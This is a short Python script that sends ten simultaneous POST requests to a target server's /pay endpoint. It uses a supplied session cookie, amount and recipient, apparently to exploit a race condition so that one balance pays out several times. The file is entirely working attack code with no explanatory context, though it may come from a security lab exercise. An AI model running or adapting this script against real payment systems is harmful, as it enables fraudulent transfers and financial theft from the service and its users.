import requests
import sys
import threading

IP_ADDRESS = sys.argv[1]
SESSION_COOKIE = sys.argv[2]
PAYMENT_AMT = sys.argv[3]
RECIPIENT = sys.argv[4]

url = "http://" + IP_ADDRESS + "/pay"
data = {
    'recipient': RECIPIENT,
    'amount': PAYMENT_AMT,
    'reason': "This is an automatic, bot-made payment."
}
cookies = {
    'session_id': SESSION_COOKIE
}

def payment_task():
    resp = requests.post(url, data=data, cookies=cookies)
    print(resp.content)

tasks = []
for i in range(10):
    tasks = tasks + [threading.Thread(target=payment_task)]

for i in range(10):
    tasks[i].start()

# for i in range(10):
#    resp = requests.post(url, data=data, cookies=cookies)
